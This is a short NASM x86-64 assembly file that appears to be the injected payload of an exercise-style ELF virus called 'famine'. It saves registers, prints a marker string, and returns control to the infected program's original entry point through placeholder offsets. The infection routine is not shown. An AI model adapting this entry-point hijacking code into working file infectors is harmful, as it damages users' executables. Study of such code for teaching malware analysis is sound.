BITS 64

SECTION .data
        famine_msg: db "....famine....",10
        famine_msg_len  : equ $-famine_msg

SECTION .text
%define WRITE 1
%define STDOUT 1

_start_payload:
    push rax                 ; save all clobbered registers
    push rcx                 ; (rcx and r11 destroyed by kernel)
    push rdx
    push rsi
    push rdi
    push r11

_infection:
    call _print_famine

_end_payload:
    pop r11
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rax

    call _ret2oep           ; jump to original entry point(oep)
    push rax
    ret

_get_rip:
    mov rax, qword [rsp]
    ret

_ret2oep:
    call _get_rip
    sub rax, 0x77777777 ; virus size without ret2oep
    sub rax, 0x77777777 ; new_entry_point
    add rax, 0x77777777 ; old entry_point
    ret

_print_famine:
    mov rax, WRITE                ; sys_write
    mov rdi, STDOUT                ; stdout
    mov rdx,famine_msg_len;len
    lea rsi,[rel $+famine_msg-$]  ; famine
    syscall
    ret